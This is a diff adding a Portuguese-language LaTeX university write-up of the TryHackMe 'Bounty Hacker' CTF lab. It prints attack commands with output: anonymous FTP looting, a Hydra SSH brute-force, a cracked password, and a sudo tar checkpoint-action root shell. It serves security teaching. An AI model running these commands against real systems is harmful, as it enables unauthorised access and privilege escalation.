@@ -1,0 +1,391 @@
+%==============================================================================
+% Write-Up de CTF - Bounty Hacker (TryHackMe)
+% Materia : CIC0087 - Topicos Avancados em Computadores - Turma 04 - 2026/2
+% Depto.  : Departamento de Ciencias da Computacao
+% Baseado na "Metodologia para Construcao de Write-Ups em CTF"
+%
+% Compilacao:  pdflatex main.tex   (rodar 2x para atualizar o Sumario)
+%==============================================================================
+\documentclass[12pt,a4paper]{article}
+
+%------------------------- Codificacao e idioma -------------------------------
+\usepackage[utf8]{inputenc}
+\usepackage[T1]{fontenc}
+\usepackage[brazil]{babel}
+
+%------------------------- Fonte Times New Roman ------------------------------
+\usepackage{newtxtext}   % corpo em Times
+\usepackage{newtxmath}   % matematica em Times
+
+%------------------------- Margens (minimo 2 cm) ------------------------------
+\usepackage[a4paper,margin=2cm,headheight=15pt,includehead,includefoot]{geometry}
+
+%------------------------- Utilitarios ----------------------------------------
+\usepackage{graphicx}
+\graphicspath{{img/}{./img/}}
+\usepackage{xcolor}
+\usepackage{float}
+\usepackage[hidelinks]{hyperref}
+\usepackage{fancyhdr}
+\usepackage{listings}
+\usepackage[most]{tcolorbox}
+\usepackage{caption}
+\usepackage{enumitem}
+\usepackage{setspace}
+
+\hypersetup{
+  colorlinks=true,
+  linkcolor=black,
+  urlcolor=blue!60!black,
+  citecolor=black
+}
+\onehalfspacing
+
+%============================= METADADOS =======================================
+\newcommand{\desafioNome}{Bounty Hacker}
+\newcommand{\plataforma}{TryHackMe}
+\newcommand{\dificuldade}{Fácil}
+\newcommand{\dataResolucao}{01/10/2026}
+\newcommand{\autorNome}{Luís Eduardo Curi Serra}
+
+% Dados academicos (fixos para a disciplina)
+\newcommand{\materia}{CIC0087 -- Tópicos Avançados em Computadores -- Turma 04 -- 2026/2}
+\newcommand{\departamento}{Departamento de Ciências da Computação}
+\newcommand{\matricula}{251033574}
+\newcommand{\professor}{Roberto Rodrigues Filho}
+\newcommand{\universidade}{Universidade de Brasília}
+%===============================================================================
+
+%------------------------- Cabecalho e rodape ---------------------------------
+\pagestyle{fancy}
+\fancyhf{}
+\lhead{\small\itshape \desafioNome}
+\rhead{\small\itshape \autorNome}
+\lfoot{\small \materia}
+\rfoot{\small Página \thepage}
+\renewcommand{\headrulewidth}{0.4pt}
+\renewcommand{\footrulewidth}{0.4pt}
+
+%------------------------- Estilo dos blocos de codigo ------------------------
+\definecolor{codebg}{gray}{0.95}
+\definecolor{codeframe}{gray}{0.75}
+\definecolor{cmt}{RGB}{100,120,100}
+\definecolor{kw}{RGB}{0,0,150}
+\definecolor{str}{RGB}{150,50,50}
+
+\lstdefinestyle{shell}{
+  backgroundcolor=\color{codebg},
+  basicstyle=\ttfamily\small,
+  keywordstyle=\color{kw}\bfseries,
+  commentstyle=\color{cmt}\itshape,
+  stringstyle=\color{str},
+  frame=single,
+  rulecolor=\color{codeframe},
+  breaklines=true,
+  breakatwhitespace=false,
+  postbreak=\mbox{\textcolor{codeframe}{$\hookrightarrow$}\space},
+  columns=fullflexible,
+  keepspaces=true,
+  showstringspaces=false,
+  tabsize=2,
+  captionpos=b,
+  xleftmargin=0.4em,
+  xrightmargin=0.4em,
+  aboveskip=1em,
+  belowskip=1em,
+}
+\lstset{style=shell}
+
+% Atalho: comando de terminal em linha
+\newcommand{\cmd}[1]{\lstinline[style=shell]|#1|}
+
+% Ambiente para OUTPUT (fundo levemente diferente, fonte menor)
+\lstdefinestyle{output}{
+  style=shell,
+  backgroundcolor=\color{gray!8},
+  basicstyle=\ttfamily\footnotesize,
+  keywordstyle=\ttfamily,
+}
+
+%------------ Caixa de "becos sem saida" (tentativas sem sucesso) --------------
+\definecolor{deadendbg}{RGB}{255,248,240}
+\definecolor{deadendframe}{RGB}{193,108,44}
+\newtcolorbox{becosemsaida}[1][Tentativas sem sucesso (becos sem saída)]{%
+  enhanced, breakable,
+  colback=deadendbg, colframe=deadendframe,
+  colbacktitle=deadendframe, coltitle=white,
+  boxrule=0.6pt, arc=2pt,
+  left=8pt, right=8pt, top=6pt, bottom=6pt,
+  fonttitle=\bfseries\small,
+  title={#1}%
+}
+
+%===============================================================================
+\begin{document}
+
+%============================= 2.1 CAPA =========================================
+\begin{titlepage}
+  \thispagestyle{empty}
+  \centering
+  {\scshape \universidade \par}
+  {\scshape \departamento \par}
+  \vspace{0.4cm}
+  {\small \materia \par}
+  \vspace{2.5cm}
+
+  \rule{\linewidth}{0.4pt}\par
+  \vspace{0.6cm}
+  {\huge \bfseries Write-Up: \desafioNome \par}
+  \vspace{0.4cm}
+  {\large Segurança Ofensiva --- Capture The Flag \par}
+  \vspace{0.6cm}
+  \rule{\linewidth}{0.4pt}\par
+
+  \vspace{2.0cm}
+  \begin{tabular}{rl}
+    \textbf{Plataforma:}       & \plataforma       \\[4pt]
+    \textbf{Dificuldade:}      & \dificuldade      \\[4pt]
+    \textbf{Data de resolução:}& \dataResolucao    \\
+  \end{tabular}
+
+  \vfill
+
+  \begin{tabular}{rl}
+    \textbf{Autor:}     & \autorNome  \\[4pt]
+    \textbf{Matrícula:} & \matricula  \\[4pt]
+    \textbf{Professor:} & \professor  \\
+  \end{tabular}
+
+  \vspace{1.2cm}
+  {\small \today \par}
+\end{titlepage}
+
+%============================= 2.2 SUMARIO ======================================
+\newpage
+\tableofcontents
+\thispagestyle{fancy}
+\newpage
+
+%============================= 2.3 VISAO GERAL ==================================
+\section{Visão Geral}
+\textbf{Bounty Hacker} é uma máquina Linux de dificuldade \emph{fácil} que expõe
+três serviços: FTP, SSH e HTTP. A superfície de ataque explorada combina uma
+\textbf{configuração insegura do FTP} (acesso \emph{anonymous} habilitado) com a
+\textbf{reutilização de credenciais}. O servidor FTP permite \emph{login}
+anônimo e disponibiliza dois arquivos: \texttt{task.txt}, assinado pelo usuário
+\texttt{lin} (vazando o \textbf{nome de usuário}), e \texttt{locks.txt}, que é na
+prática uma \textbf{lista de senhas}. Com usuário e \emph{wordlist} em mãos,
+um ataque de \emph{força bruta} contra o SSH descobre a senha válida de
+\texttt{lin}, concedendo acesso ao sistema e à \emph{flag} de usuário. A
+enumeração local revela uma política de \texttt{sudo} perigosa: \texttt{lin}
+pode executar \texttt{/bin/tar} como \texttt{root}, binário que (conforme o
+\emph{GTFOBins}) permite executar comandos arbitrários via
+\texttt{-{}-checkpoint-action}, resultando em escalada para \texttt{root}.
+O fluxo geral foi: reconhecimento (Nmap) $\rightarrow$ coleta de credenciais
+(FTP \emph{anonymous}) $\rightarrow$ força bruta de SSH $\rightarrow$ acesso como
+\texttt{lin} $\rightarrow$ escalada via \texttt{sudo}/\texttt{tar} mal
+configurado $\rightarrow$ \texttt{root}.
+
+%============================= 2.4 RECONHECIMENTO ===============================
+\section{Reconhecimento}
+
+\subsection{Varredura de portas}
+A varredura inicial identifica quais serviços estão expostos e suas portas,
+orientando as fases seguintes.
+
+\begin{lstlisting}[language=bash,caption={Varredura de portas e serviços com Nmap.}]
+nmap -T4 <TARGET_IP>
+\end{lstlisting}
+
+A varredura retorna \textbf{três portas abertas}: \textbf{21/tcp (FTP)},
+\textbf{22/tcp (SSH)} e \textbf{80/tcp (HTTP)}.
+
+\begin{lstlisting}[style=output,caption={Portas abertas retornadas pela varredura.}]
+Starting Nmap 7.99 ( https://nmap.org )
+Nmap scan report for <TARGET_IP>
+Host is up (0.14s latency).
+Not shown: 967 filtered tcp ports (no-response), 30 closed tcp ports (reset)
+PORT   STATE SERVICE
+21/tcp open  ftp
+22/tcp open  ssh
+80/tcp open  http
+\end{lstlisting}
+
+\begin{figure}[H]
+  \centering
+  % \includegraphics[width=0.95\linewidth]{nmap.png}
+  \caption{Varredura Nmap contra o alvo: portas 21 (FTP), 22 (SSH) e 80 (HTTP)
+  abertas.}
+  \label{fig:nmap}
+\end{figure}
+
+%============================= 2.5 EXPLORACAO ===================================
+\section{Exploração}
+
+\subsection{Coleta de credenciais via FTP anônimo}
+O serviço FTP aceita \emph{login} \textbf{anonymous}, uma má configuração que
+expõe o conteúdo do servidor sem autenticação. Após autenticar com o usuário
+\texttt{anonymous}, listam-se dois arquivos: \texttt{locks.txt} e
+\texttt{task.txt}, ambos baixados com o comando \cmd{get}.
+
+\begin{lstlisting}[language=bash,caption={Login anônimo no FTP e download dos arquivos.}]
+ftp <TARGET_IP> 21
+# Name: anonymous   (sem senha)
+ftp> ls
+ftp> get locks.txt
+ftp> get task.txt
+\end{lstlisting}
+
+\begin{lstlisting}[style=output,caption={Sessão FTP: login bem-sucedido e listagem dos arquivos.}]
+220 (vsFTPd 3.0.5)
+Name (<TARGET_IP>:kali): anonymous
+230 Login successful.
+Remote system type is UNIX.
+ftp> ls
+-rw-rw-r--  1 ftp  ftp  418 Jun 07  2020 locks.txt
+-rw-rw-r--  1 ftp  ftp   68 Jun 07  2020 task.txt
+226 Directory send OK.
+\end{lstlisting}
+
+\begin{figure}[H]
+  \centering
+  % \includegraphics[width=0.95\linewidth]{ftp_login.png}
+  \caption{Login \emph{anonymous} no serviço FTP e \emph{download} dos arquivos
+  \texttt{locks.txt} e \texttt{task.txt}.}
+  \label{fig:ftp}
+\end{figure}
+
+\subsection{Análise dos arquivos}
+O arquivo \texttt{task.txt} contém uma lista de tarefas \textbf{assinada por
+\texttt{lin}}, revelando o \textbf{nome de usuário} do sistema.
+
+\begin{lstlisting}[style=output,caption={Conteúdo de task.txt: assinatura revela o usuário.}]
+1.) Protect Vicious.
+2.) Plan for Red Eye pickup on the moon.
+
+-lin
+\end{lstlisting}
+
+O arquivo \texttt{locks.txt} contém 26 linhas de senhas candidatas --- ou seja,
+uma \textbf{lista de senhas} (\emph{wordlist}) pronta para um ataque de força
+bruta contra o usuário \texttt{lin}.
+
+\begin{lstlisting}[style=output,caption={Trecho de locks.txt (lista de senhas candidatas).}]
+rEddrAGON
+ReDdr4g0nSynd!cat3
+Dr@gOn$yn9icat3
+...
+RedDr4gonSynd1cat3      <-- senha valida
+...
+ReDSynd1ca7e
+\end{lstlisting}
+
+\subsection{Força bruta no SSH}
+Com o usuário (\texttt{lin}) e a \emph{wordlist} (\texttt{locks.txt}), executa-se
+um ataque de força bruta contra o SSH com o \emph{Hydra}.
+
+\begin{lstlisting}[language=bash,caption={Força bruta de senha no SSH com Hydra.}]
+hydra -l lin -P locks.txt ssh://<TARGET_IP>
+\end{lstlisting}
+
+O ataque descobre a senha válida do usuário \texttt{lin}:
+
+\begin{lstlisting}[style=output,caption={Credencial descoberta pelo Hydra.}]
+[22][ssh] host: <TARGET_IP>   login: lin   password: RedDr4gonSynd1cat3
+\end{lstlisting}
+
+\begin{becosemsaida}
+\begin{itemize}[leftmargin=1.4em,itemsep=2pt,topsep=2pt]
+  \item Os arquivos do FTP poderiam, à primeira vista, sugerir uma trilha
+        relacionada ao serviço HTTP (porta 80). Entretanto, o conteúdo real de
+        \texttt{task.txt} (usuário) e \texttt{locks.txt} (senhas) aponta
+        diretamente para a força bruta no SSH --- o serviço web não é o vetor.
+\end{itemize}
+\end{becosemsaida}
+
+\subsection{Acesso ao sistema e flag de usuário}
+De posse da credencial \texttt{lin:RedDr4gonSynd1cat3}, autentica-se via SSH e
+lê-se a \emph{flag} de usuário no diretório \emph{home}.
+
+\begin{lstlisting}[language=bash,caption={Login via SSH e leitura da flag de usuário.}]
+ssh lin@<TARGET_IP>
+# senha: RedDr4gonSynd1cat3
+ls -la
+cat user.txt            # -> <FLAG_USER>
+\end{lstlisting}
+
+\begin{figure}[H]
+  \centering
+  % \includegraphics[width=0.95\linewidth]{ssh_login.png}
+  \caption{Autenticação via SSH como \texttt{lin} e leitura da \emph{flag} de
+  usuário (\texttt{user.txt}).}
+  \label{fig:ssh}
+\end{figure}
+
+%======================== 2.6 ESCALADA DE PRIVILEGIOS ==========================
+\section{Escalada de Privilégios}
+
+\subsection{Enumeração local}
+Como \texttt{lin}, a primeira verificação é a política de \texttt{sudo} do
+usuário atual com \cmd{sudo -l} (usando a senha já descoberta). O resultado
+mostra que \texttt{lin} pode executar \texttt{/bin/tar} como \texttt{root}.
+
+\begin{lstlisting}[style=output,caption={Politica de sudo: lin pode executar /bin/tar como root.}]
+Matching Defaults entries for lin on ip-<TARGET_HOST>:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin
+
+User lin may run the following commands on ip-<TARGET_HOST>:
+    (root) /bin/tar
+\end{lstlisting}
+
+\subsection{Obtenção de root e flag final}
+O binário \texttt{tar}, quando executável via \texttt{sudo}, permite execução de
+comandos arbitrários através da opção \texttt{-{}-checkpoint-action} (técnica
+documentada no \emph{GTFOBins}). Dispara-se um \emph{shell} de \texttt{root}
+usando um ponto de checagem que executa \texttt{/bin/sh}.
+
+\begin{lstlisting}[language=bash,caption={Escalada a root abusando do sudo + tar (GTFOBins).}]
+sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
+whoami            # -> root
+cd /root
+cat root.txt      # -> <FLAG_ROOT>
+\end{lstlisting}
+
+\begin{figure}[H]
+  \centering
+  % \includegraphics[width=0.95\linewidth]{tar_root.png}
+  \caption{Escalada de privilégio: \texttt{sudo tar} com
+  \texttt{-{}-checkpoint-action} abre um \emph{shell} de \texttt{root}; leitura
+  da \emph{flag} final em \texttt{/root/root.txt}.}
+  \label{fig:privesc}
+\end{figure}
+
+%============================= 2.7 CONCLUSAO ====================================
+\section{Conclusão}
+O comprometimento resultou do encadeamento de más configurações. Primeiro, o
+\textbf{FTP anônimo} expôs dois arquivos que, juntos, entregaram o
+\textbf{nome de usuário} (\texttt{lin}, na assinatura de \texttt{task.txt}) e uma
+\textbf{lista de senhas} (\texttt{locks.txt}). Em seguida, a ausência de proteção
+contra \textbf{força bruta} no SSH permitiu descobrir a senha válida
+(\texttt{RedDr4gonSynd1cat3}) e obter acesso ao sistema. Por fim, uma
+\textbf{política de \texttt{sudo} insegura} concedia a \texttt{lin} a execução de
+\texttt{/bin/tar} como \texttt{root} --- binário que permite \emph{escape} de
+\emph{shell}, resultando em escalada trivial para \texttt{root}. As falhas
+centrais foram a \textbf{exposição de credenciais via FTP anônimo} e a
+\textbf{atribuição de um binário perigoso no \texttt{sudo}}.
+
+%============================= 2.8 REFERENCIAS ==================================
+\section{Referências}
+Este desafio decorre de más configurações (\emph{FTP anônimo}, \emph{força bruta}
+e \emph{sudo} com binário perigoso), não de uma CVE específica.
+\begin{itemize}[leftmargin=1.5em]
+  \item TryHackMe --- Sala \emph{Bounty Hacker} ---
+        \url{https://tryhackme.com/room/cowboyhacker}
+  \item GTFOBins --- \texttt{tar} ---
+        \url{https://gtfobins.github.io/gtfobins/tar/}
+  \item THC-Hydra ---
+        \url{https://github.com/vanhauser-thc/thc-hydra}
+\end{itemize}
+
+\end{document}
